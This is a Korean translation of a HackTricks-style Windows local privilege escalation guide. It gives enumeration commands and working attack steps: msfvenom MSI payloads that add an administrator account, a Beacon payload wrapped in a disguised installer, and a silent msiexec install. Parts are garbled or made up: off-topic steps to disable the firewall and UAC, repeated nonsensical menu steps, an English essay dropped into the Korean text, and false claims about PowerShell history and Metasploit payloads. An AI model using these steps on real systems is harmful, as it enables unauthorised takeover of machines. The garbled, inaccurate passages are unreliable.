# Windows 로컬 권한 상승

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **해킹 트릭을 공유하려면 PR을** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 제출하세요.**

</details>

### **Windows 로컬 권한 상승 벡터를 찾는 가장 좋은 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 초기 Windows 이론

### 액세스 토큰

**Windows 액세스 토큰이 무엇인지 모르신다면, 계속하기 전에 다음 페이지를 읽어보세요:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACL - DACL/SACL/ACE

**ACL - DACL/SACL/ACE에 대한 자세한 정보는 다음 페이지를 확인하세요:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### 무결성 수준

**Windows에서 무결성 수준이 무엇인지 모르신다면, 계속하기 전에 다음 페이지를 읽어보세요:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows 보안 제어

Windows에는 **시스템 열거, 실행 파일 실행 또는 활동 감지를 방지**할 수 있는 다양한 요소가 있습니다. 권한 상승 열거를 시작하기 전에 다음 **페이지**를 **읽고** 이러한 **방어** **메커니즘**을 **열거**해야 합니다:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## 시스템 정보

### 버전 정보 열거

Windows 버전에 알려진 취약점이 있는지 확인하세요 (적용된 패치도 확인).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 버전 취약점

이 [사이트](https://msrc.microsoft.com/update-guide/vulnerability)는 Microsoft 보안 취약점에 대한 자세한 정보를 검색하는 데 유용합니다. 이 데이터베이스에는 4,700개 이상의 보안 취약점이 있으며, 이는 Windows 환경이 제공하는 **대규모 공격 표면**을 보여줍니다.

**시스템에서**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas에는 watson이 포함되어 있음)_

**시스템 정보와 함께 로컬에서**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit의 Github 저장소:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 환경

환경 변수에 저장된 자격 증명/중요 정보가 있나요?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShell 기록

PowerShell은 Windows 운영 체제에서 사용되는 강력한 명령 줄 셸 및 스크립팅 언어입니다. PowerShell은 사용자의 작업을 기록하는 기능을 제공합니다. 이 기록은 사용자가 이전에 실행한 명령어와 스크립트를 포함합니다.

PowerShell 기록은 사용자의 작업을 추적하고 분석하는 데 유용합니다. 특히, 시스템 관리자나 보안 전문가는 PowerShell 기록을 사용하여 잠재적인 보안 위협을 탐지하고 시스템의 보안을 강화할 수 있습니다.

PowerShell 기록은 기본적으로 사용자의 홈 디렉토리에 위치한 "PowerShell_history.txt"라는 파일에 저장됩니다. 이 파일은 텍스트 형식으로 저장되며, 사용자가 PowerShell 세션을 종료할 때마다 업데이트됩니다.

PowerShell 기록을 검토하려면 다음 명령을 사용할 수 있습니다.

```powershell
Get-History
```

이 명령은 사용자의 PowerShell 기록을 표시합니다. 각 명령은 고유한 ID와 함께 표시되며, 사용자는 이 ID를 사용하여 특정 명령을 다시 실행할 수 있습니다.

PowerShell 기록은 기본적으로 모든 사용자에게 공개되므로, 보안상의 이유로 기록을 정기적으로 검토하고 필요한 경우 삭제해야 합니다.
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript 파일

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)에서 그룹 정책을 사용하여 PowerShell 트랜스크립션 로깅을 활성화하는 방법을 배울 수 있습니다.
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell 모듈 로깅

PowerShell 파이프라인 실행에 대한 세부 정보가 기록되며, 실행된 명령, 명령 호출 및 스크립트 일부가 포함됩니다. 그러나 완전한 실행 세부 정보와 출력 결과는 캡처되지 않을 수 있습니다.

이를 활성화하려면, **"Powershell Transcription"** 대신 **"Module Logging"**을 선택하여 설명서의 "Transcript files" 섹션의 지침을 따르십시오.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell 로그에서 마지막 15개 이벤트를 보려면 다음을 실행하십시오:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **스크립트 블록 로깅**

스크립트의 실행에 대한 완전한 활동 및 전체 내용 기록이 캡처되어, 코드 블록이 실행될 때마다 문서화됩니다. 이 과정은 각 활동에 대한 포렌식 및 악성 행위 분석을 위한 포괄적인 감사 추적을 보존합니다. 실행 시 모든 활동을 문서화함으로써 프로세스에 대한 자세한 통찰력을 제공합니다.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
스크립트 블록의 로깅 이벤트는 Windows 이벤트 뷰어에서 다음 경로에서 찾을 수 있습니다: **응용 프로그램 및 서비스 로그 > Microsoft > Windows > PowerShell > 운영**.\
마지막 20개 이벤트를 보려면 다음을 사용할 수 있습니다:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 인터넷 설정

#### Internet Explorer Enhanced Security Configuration (IE ESC)

Internet Explorer Enhanced Security Configuration (IE ESC)는 Windows 서버 운영 체제에서 기본적으로 활성화되어 있는 보안 기능입니다. 이 기능은 웹 브라우징 및 인터넷 활동에 대한 보안을 강화하기 위해 설계되었습니다. 그러나 이 기능은 일부 사용자에게는 불편함을 초래할 수 있습니다.

IE ESC를 비활성화하려면 다음 단계를 따르세요.

1. 서버 관리자 도구를 엽니다.
2. 서버 관리자 도구에서 [서버 관리자]를 선택합니다.
3. [서버 관리자] 창에서 [서버 관리자 (현재 서버)]를 선택합니다.
4. [서버 관리자 (현재 서버)] 창에서 [서버 관리자 (현재 서버)]를 다시 선택합니다.
5. [서버 관리자 (현재 서버)] 창에서 [로컬 서버]를 선택합니다.
6. [로컬 서버] 창에서 [IE Enhanced Security Configuration]을 클릭합니다.
7. [IE Enhanced Security Configuration] 창에서 [관리자] 및 [사용자] 옵션을 각각 [Off]로 변경합니다.
8. 변경 사항을 적용하려면 [적용]을 클릭합니다.

#### Windows Firewall

Windows 방화벽은 네트워크 트래픽을 모니터링하고 제어하는 데 사용되는 기본적인 보안 도구입니다. 하지만 때로는 특정 애플리케이션 또는 서비스의 작동에 문제를 일으킬 수 있습니다.

Windows 방화벽을 비활성화하려면 다음 단계를 따르세요.

1. 제어판을 엽니다.
2. 제어판에서 [시스템 및 보안]을 선택합니다.
3. [시스템 및 보안] 창에서 [Windows 방화벽]을 선택합니다.
4. [Windows 방화벽] 창에서 [Windows 방화벽 켜기 또는 끄기]를 클릭합니다.
5. [개인 및 공용 네트워크 위치 설정]에서 [Windows 방화벽 사용 안 함]을 선택합니다.
6. 변경 사항을 적용하려면 [확인]을 클릭합니다.

#### Windows Update

Windows 업데이트는 운영 체제의 보안 및 기능 개선을 위해 주기적으로 제공되는 업데이트입니다. 이러한 업데이트를 설치하지 않으면 시스템에 취약점이 노출될 수 있습니다.

Windows 업데이트를 확인하고 설치하려면 다음 단계를 따르세요.

1. 시작 메뉴에서 [설정]을 선택합니다.
2. [설정] 창에서 [업데이트 및 보안]을 선택합니다.
3. [업데이트 및 보안] 창에서 [Windows 업데이트]를 선택합니다.
4. [Windows 업데이트] 창에서 [업데이트 확인]을 클릭합니다.
5. 사용 가능한 업데이트가 표시되면 [업데이트 설치]를 클릭합니다.
6. 업데이트 설치가 완료되면 시스템을 다시 시작합니다.

#### User Account Control (UAC)

사용자 계정 제어 (UAC)는 Windows 운영 체제에서 실행되는 프로그램이 관리자 권한으로 실행되는 것을 방지하기 위한 보안 기능입니다. 그러나 일부 사용자는 UAC로 인해 작업 수행이 불편해질 수 있습니다.

UAC를 비활성화하려면 다음 단계를 따르세요.

1. 제어판을 엽니다.
2. 제어판에서 [사용자 계정]을 선택합니다.
3. [사용자 계정] 창에서 [사용자 계정 제어 설정 변경]을 클릭합니다.
4. [사용자 계정 제어 설정] 창에서 슬라이더를 가장 아래로 이동하여 [알림 없음]으로 설정합니다.
5. 변경 사항을 적용하려면 [확인]을 클릭합니다.

#### Guest Account

게스트 계정은 일반적으로 보안 위험을 초래할 수 있는 계정입니다. 따라서 게스트 계정을 비활성화하는 것이 좋습니다.

게스트 계정을 비활성화하려면 다음 단계를 따르세요.

1. 제어판을 엽니다.
2. 제어판에서 [사용자 계정]을 선택합니다.
3. [사용자 계정] 창에서 [게스트 계정]을 선택합니다.
4. [게스트 계정] 창에서 [게스트 계정 사용 안 함]을 선택합니다.
5. 변경 사항을 적용하려면 [확인]을 클릭합니다.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 드라이브

Windows 운영 체제에서 드라이브는 컴퓨터에 연결된 저장 장치를 나타냅니다. 각 드라이브는 볼륨 레이블과 드라이브 문자로 식별됩니다. 드라이브 문자는 알파벳으로 표시되며, 일반적으로 C:\, D:\, E:\ 등으로 표시됩니다.

드라이브는 파일 시스템에 따라 다른 형식으로 포맷될 수 있습니다. 일반적으로 사용되는 파일 시스템은 NTFS, FAT32, exFAT 등이 있습니다.

드라이브는 파일 및 폴더를 저장하는 데 사용되며, 시스템 파일과 사용자 데이터를 포함할 수 있습니다. 드라이브에는 시스템 드라이브와 데이터 드라이브가 있을 수 있으며, 시스템 드라이브에는 운영 체제와 관련된 파일이 저장됩니다.

드라이브에 대한 액세스 권한은 사용자 계정 및 그룹에 따라 다르게 설정될 수 있습니다. 일반적으로 관리자 계정은 모든 드라이브에 대한 액세스 권한을 가지고 있습니다.
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

시스템이 http**S** 대신 http를 사용하여 업데이트를 요청하는 경우 시스템을 침해할 수 있습니다.

다음을 실행하여 네트워크가 SSL이 아닌 WSUS 업데이트를 사용하는지 확인합니다:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
만약 다음과 같은 응답을 받는다면:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
그리고 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer`가 `1`과 같다면, **이는 취약점이 있습니다.** 마지막 레지스트리가 0과 같다면, WSUS 항목은 무시될 것입니다.

이 취약점을 악용하기 위해 [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus)와 같은 도구를 사용할 수 있습니다. 이들은 MiTM(Middleman-in-the-Middle)으로 작동하는 악용 스크립트로, 비-SSL WSUS 트래픽에 '가짜' 업데이트를 주입합니다.

연구 내용은 여기에서 확인할 수 있습니다:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**전체 보고서는 여기에서 확인하세요**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
기본적으로 이 버그가 악용하는 취약점은 다음과 같습니다:

> 만약 로컬 사용자 프록시를 수정할 수 있는 권한이 있다면, 그리고 Windows 업데이트가 Internet Explorer의 설정에 구성된 프록시를 사용한다면, 우리는 [PyWSUS](https://github.com/GoSecure/pywsus)를 로컬로 실행하여 자체 트래픽을 가로채고 자산에서 권한 상승 코드를 실행할 수 있습니다.
>
> 더욱이, WSUS 서비스는 현재 사용자의 설정을 사용하기 때문에, 현재 사용자의 인증서 저장소도 사용합니다. WSUS 호스트 이름을 위한 자체 서명 인증서를 생성하고 이 인증서를 현재 사용자의 인증서 저장소에 추가한다면, HTTP 및 HTTPS WSUS 트래픽을 모두 가로챌 수 있습니다. WSUS는 인증서에 대한 신뢰-처음사용(trust-on-first-use) 유형의 검증을 구현하기 위해 HSTS와 같은 메커니즘을 사용하지 않습니다. 제시된 인증서가 사용자에 의해 신뢰되고 올바른 호스트 이름을 가지고 있다면, 서비스에서 인증서를 수락합니다.

이 취약점을 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) 도구를 사용하여 악용할 수 있습니다 (해당 도구가 공개되면).

## KrbRelayUp

특정 조건에서 Windows **도메인** 환경에서 **로컬 권한 상승** 취약점이 존재합니다. 이 조건에는 **LDAP 서명이 강제되지 않는** 환경, 사용자가 **리소스 기반 제한된 위임 (RBCD)**을 구성할 수 있는 자체 권한을 가지고 있으며, 사용자가 도메인 내에서 컴퓨터를 생성할 수 있는 능력이 포함됩니다. 이러한 **요구 사항**은 **기본 설정**을 사용하여 충족됩니다.

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)에서 악용을 찾을 수 있습니다.

공격 흐름에 대한 자세한 정보는 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)에서 확인할 수 있습니다.

## AlwaysInstallElevated

만약 이 2개의 레지스트리가 **활성화**되어 있다면 (값이 **0x1**), 모든 권한을 가진 사용자는 NT AUTHORITY\\**SYSTEM**으로 `*.msi` 파일을 **설치**(실행)할 수 있습니다.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit 페이로드

Metasploit은 다양한 페이로드를 제공하여 시스템에 악성 코드를 전달하는 데 사용됩니다. 이러한 페이로드는 다양한 목적을 위해 설계되었으며, 로컬 권한 상승을 위해 사용될 수도 있습니다. 다음은 일부 주요 Metasploit 페이로드입니다.

- **reverse_tcp**: 이 페이로드는 공격자가 피해 시스템에 역방향 TCP 연결을 설정하여 악성 코드를 전송합니다. 이를 통해 공격자는 피해 시스템에 대한 원격 액세스를 얻을 수 있습니다.

- **bind_tcp**: 이 페이로드는 공격자가 특정 포트에서 수신 대기하는 TCP 서버를 생성합니다. 피해 시스템이 해당 포트로 연결하면 악성 코드가 전송되어 공격자가 원격으로 피해 시스템을 제어할 수 있습니다.

- **meterpreter**: 이 페이로드는 Metasploit의 고급 셸로, 공격자가 피해 시스템에 대한 완전한 제어를 얻을 수 있습니다. 이 페이로드는 다양한 기능과 명령어를 제공하여 공격자가 시스템에서 다양한 작업을 수행할 수 있도록 합니다.

- **shell_reverse_tcp**: 이 페이로드는 공격자가 피해 시스템에 역방향 TCP 셸을 생성하여 악성 코드를 전송합니다. 이를 통해 공격자는 피해 시스템에 대한 원격 셸 액세스를 얻을 수 있습니다.

- **shell_bind_tcp**: 이 페이로드는 공격자가 특정 포트에서 수신 대기하는 TCP 셸을 생성합니다. 피해 시스템이 해당 포트로 연결하면 악성 코드가 전송되어 공격자가 원격으로 피해 시스템을 제어할 수 있습니다.

이러한 Metasploit 페이로드는 공격자가 시스템에 대한 권한 상승을 수행하는 데 사용될 수 있으며, 효과적인 공격을 위해 적절한 페이로드를 선택하는 것이 중요합니다.
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
만약 미터프리터 세션이 있다면, **`exploit/windows/local/always_install_elevated`** 모듈을 사용하여 이 기술을 자동화할 수 있습니다.

### PowerUP

Power-Up에서 `Write-UserAddMSI` 명령을 사용하여 현재 디렉토리에 권한 상승을 위한 Windows MSI 이진 파일을 생성할 수 있습니다. 이 스크립트는 사용자/그룹 추가를 요청하는 미리 컴파일된 MSI 설치 프로그램을 작성합니다 (따라서 GUI 액세스가 필요합니다):
```
Write-UserAddMSI
```
생성된 이진 파일을 실행하여 권한을 승격하세요.

### MSI 래퍼

이 도구를 사용하여 MSI 래퍼를 만드는 방법에 대해 알아보려면 이 튜토리얼을 읽으세요. 참고로, "**.bat**" 파일을 래핑하여 **명령줄을 실행**하려는 경우에도 사용할 수 있습니다.

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIX로 MSI 만들기

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Visual Studio로 MSI 만들기

* Cobalt Strike 또는 Metasploit을 사용하여 `C:\privesc\beacon.exe`에 **새로운 Windows EXE TCP 페이로드**를 생성합니다.
* **Visual Studio**를 열고, **새 프로젝트 만들기**를 선택하고 검색 상자에 "installer"를 입력합니다. **설치 마법사** 프로젝트를 선택하고 **다음**을 클릭합니다.
* **AlwaysPrivesc**와 같은 이름의 프로젝트를 지정하고, 위치에 **`C:\privesc`**를 사용하고, **솔루션과 프로젝트를 동일한 디렉토리에 배치**를 선택한 후 **만들기**를 클릭합니다.
* **다음**을 계속 클릭하여 4단계 중 3단계(포함할 파일 선택)에 도달합니다. **추가**를 클릭하고 방금 생성한 Beacon 페이로드를 선택한 다음 **완료**를 클릭합니다.
* **솔루션 탐색기**에서 **AlwaysPrivesc** 프로젝트를 강조 표시하고 **속성**에서 **TargetPlatform**을 **x86**에서 **x64**로 변경합니다.
* 설치된 앱이 더 신뢰할 수 있도록 **작성자** 및 **제조사**와 같은 다른 속성을 변경할 수도 있습니다.
* 프로젝트를 마우스 오른쪽 단추로 클릭하고 **보기 > 사용자 지정 작업**을 선택합니다.
* **설치**를 마우스 오른쪽 단추로 클릭하고 **사용자 지정 작업 추가**를 선택합니다.
* **Application Folder**를 더블 클릭하고 **beacon.exe** 파일을 선택한 다음 **확인**을 클릭합니다. 이렇게 하면 설치 프로그램이 실행될 때 Beacon 페이로드가 실행됩니다.
* **사용자 지정 작업 속성**에서 **Run64Bit**를 **True**로 변경합니다.
* 마지막으로, **빌드**합니다.
* "File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'" 경고가 표시되는 경우 플랫폼을 x64로 설정했는지 확인하세요.

### MSI 설치

악성 `.msi` 파일의 **배경에서** **설치**를 실행하려면:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
이 취약점을 악용하기 위해 다음을 사용할 수 있습니다: _exploit/windows/local/always\_install\_elevated_

## 백신 및 탐지기

### 감사 설정

이러한 설정은 **기록**되는 내용을 결정하므로 주의해야 합니다.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding(WEF)는 로그가 어디로 전송되는지 알아내는 데 흥미로운 기능입니다.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**는 도메인에 가입된 컴퓨터에서 각 비밀번호가 고유하고 무작위로 생성되며 정기적으로 업데이트되도록 하는 **로컬 관리자 비밀번호 관리**를 위해 설계되었습니다. 이러한 비밀번호는 Active Directory 내에 안전하게 저장되며, 권한이 충분하게 부여된 사용자만이 ACL을 통해 액세스할 수 있으며, 인가된 경우에만 로컬 관리자 비밀번호를 볼 수 있습니다.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

활성화된 경우, **평문 비밀번호가 LSASS**(Local Security Authority Subsystem Service)에 저장됩니다.\
[**이 페이지에서 WDigest에 대한 자세한 정보**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA 보호

**Windows 8.1**부터 Microsoft는 로컬 보안 권한 (LSA)에 대한 강화된 보호 기능을 도입하여 신뢰되지 않는 프로세스가 해당 메모리를 읽거나 코드를 주입하는 시도를 차단하여 시스템을 더욱 안전하게 보호합니다.\
[**LSA 보호에 대한 자세한 정보는 여기에서 확인하세요**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### 자격 증명 보호

**자격 증명 보호(Credential Guard)**는 **Windows 10**에서 도입되었습니다. 이 기능은 패스-더-해시 공격과 같은 위협으로부터 장치에 저장된 자격 증명을 보호하는 것을 목적으로 합니다.
[**자격 증명 보호에 대한 자세한 정보는 여기에서 확인하세요.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### 캐시된 자격 증명

**도메인 자격 증명**은 **로컬 보안 권한자** (LSA)에 의해 인증되며 운영 체제 구성 요소에서 사용됩니다. 사용자의 로그온 데이터가 등록된 보안 패키지에 의해 인증되면 일반적으로 사용자의 도메인 자격 증명이 설정됩니다.\
[**캐시된 자격 증명에 대한 자세한 정보는 여기에서 확인하세요**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 사용자 및 그룹

### 사용자 및 그룹 열거

당신이 속한 그룹 중에 흥미로운 권한을 가진 그룹이 있는지 확인해야 합니다.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 특권 그룹

만약 특권 그룹에 속한다면, 권한 상승을 할 수도 있습니다. 특권 그룹에 대해 배우고 권한 상승을 위해 그들을 악용하는 방법에 대해 여기에서 알아보세요:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### 토큰 조작

토큰에 대해 자세히 알아보려면 이 페이지를 확인하세요: [Windows Tokens](../authentication-credentials-uac-and-efs.md#access-tokens).\
다음 페이지에서 흥미로운 토큰에 대해 배우고 그들을 악용하는 방법을 알아보세요:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### 로그인한 사용자 / 세션
```bash
qwinsta
klist sessions
```
### 홈 폴더

In Windows, each user has a home folder that contains their personal files and settings. These folders are located in the `C:\Users` directory and are named after the user's username. The home folder is a crucial target for privilege escalation because it often contains sensitive information and configuration files that can be leveraged to gain higher privileges.

#### Default Folders

By default, each user's home folder contains several subfolders, including:

- `Desktop`: This folder contains the user's desktop icons and files.
- `Documents`: This folder is used to store the user's documents and files.
- `Downloads`: This folder is the default location for downloaded files.
- `Pictures`: This folder is used to store the user's pictures and images.
- `Music`: This folder is used to store the user's music files.
- `Videos`: This folder is used to store the user's videos.

#### Configuration Files

The home folder also contains various configuration files that can be exploited for privilege escalation. These files may contain credentials, sensitive information, or configuration settings that can be manipulated to gain elevated privileges.

#### Exploitation Techniques

To escalate privileges using the home folder, an attacker can:

1. Look for sensitive information in configuration files, such as passwords or API keys.
2. Modify configuration files to execute arbitrary commands or gain elevated privileges.
3. Replace executable files in the home folder with malicious ones to gain code execution with elevated privileges.
4. Exploit misconfigurations or vulnerabilities in applications that use files from the home folder.

#### Mitigation

To mitigate the risk of privilege escalation through the home folder, it is recommended to:

- Regularly review and secure the permissions of files and folders in the home directory.
- Encrypt sensitive files and credentials stored in the home folder.
- Avoid storing sensitive information in configuration files.
- Keep software and applications up to date to prevent exploitation of vulnerabilities.
- Implement strong password policies to protect user accounts.
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### 암호 정책

Windows 운영 체제에서는 암호 정책을 설정하여 시스템 보안을 강화할 수 있습니다. 암호 정책은 사용자가 안전한 암호를 사용하도록 강제하는 규칙을 정의합니다. 이를 통해 악의적인 사용자가 시스템에 접근하여 권한 상승을 시도하는 것을 방지할 수 있습니다.

#### 암호 복잡성

암호 복잡성은 사용자가 생성하는 암호의 강도를 결정하는 요소입니다. 일반적으로 암호 복잡성은 다음과 같은 요구 사항을 포함합니다.

- 최소 길이: 암호의 최소 길이를 설정하여 짧은 암호를 방지합니다.
- 대문자 및 소문자: 암호에는 대문자와 소문자가 모두 포함되어야 합니다.
- 숫자: 암호에는 숫자가 포함되어야 합니다.
- 특수 문자: 암호에는 특수 문자가 포함되어야 합니다.

#### 암호 변경 정책

암호 변경 정책은 사용자가 주기적으로 암호를 변경하도록 요구하는 규칙을 정의합니다. 이를 통해 오래된 암호를 사용하는 것을 방지하고 시스템 보안을 강화할 수 있습니다. 암호 변경 정책은 다음과 같은 요구 사항을 포함할 수 있습니다.

- 최소 변경 주기: 사용자가 암호를 변경해야 하는 최소 기간을 설정합니다.
- 최소 사용 기간: 사용자가 변경한 암호를 일정 기간 동안 사용해야 하는 최소 기간을 설정합니다.
- 최대 사용 기간: 사용자가 변경한 암호를 사용할 수 있는 최대 기간을 설정합니다.

#### 계정 잠금 정책

계정 잠금 정책은 사용자가 일정 횟수 이상 잘못된 암호를 입력할 경우 계정을 잠금하는 규칙을 정의합니다. 이를 통해 악의적인 사용자가 무차별적으로 암호를 추측하여 시스템에 접근하는 것을 방지할 수 있습니다. 계정 잠금 정책은 다음과 같은 요구 사항을 포함할 수 있습니다.

- 잠금 임계값: 사용자가 잘못된 암호를 입력할 수 있는 최대 횟수를 설정합니다.
- 잠금 기간: 계정이 잠금된 후 사용자가 다시 로그인할 수 있는 기간을 설정합니다.

#### 기타 보안 설정

암호 정책 외에도 Windows 운영 체제에서는 다양한 보안 설정을 통해 시스템 보안을 강화할 수 있습니다. 이러한 설정은 다음과 같은 것들을 포함할 수 있습니다.

